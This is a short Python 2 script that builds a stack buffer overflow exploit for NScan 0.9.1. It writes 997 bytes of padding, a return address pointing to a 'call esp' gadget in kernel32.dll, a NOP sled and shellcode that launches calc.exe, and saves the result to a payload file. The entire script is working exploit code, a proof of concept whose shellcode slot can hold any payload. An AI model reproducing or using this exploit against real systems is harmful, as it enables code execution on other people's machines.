import struct
junk = '\x41'*997 # 997 bytes to hit the EIP
eip = struct.pack("<L",0x7c836a78) # use little-endian to address 0x7c836a78 # call esp # kernel32.dll
nops = '\x90'*10

# pop calc.exe 

shellcode = "\x31\xC9"                  # xor ecx,ecx
shellcode += "\x51"                     # push ecx
shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
shellcode += "\x54"                     # push dword ptr esp
shellcode += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
shellcode += "\xFF\xD0"                 # call eax

payload = junk + eip + nops + shellcode # combine our exploit with nop sled and working shellcode

try:
    f = open("C:\\Documents and Settings\\user\\Desktop\\log\\dig\\payload.txt","wb")
    f.write(payload)
    f.close()
    print "\nNScan 0.9.1 Saved Return Pointer Overwrite Exploit"
    print "\nExploit written successfully!"
    print "Buffer size: " + str(len(payload)) + "\n"
except Exception, e:
    print "\nError! Exploit could not be generated, error details follow:\n"
    print str(e) + "\n"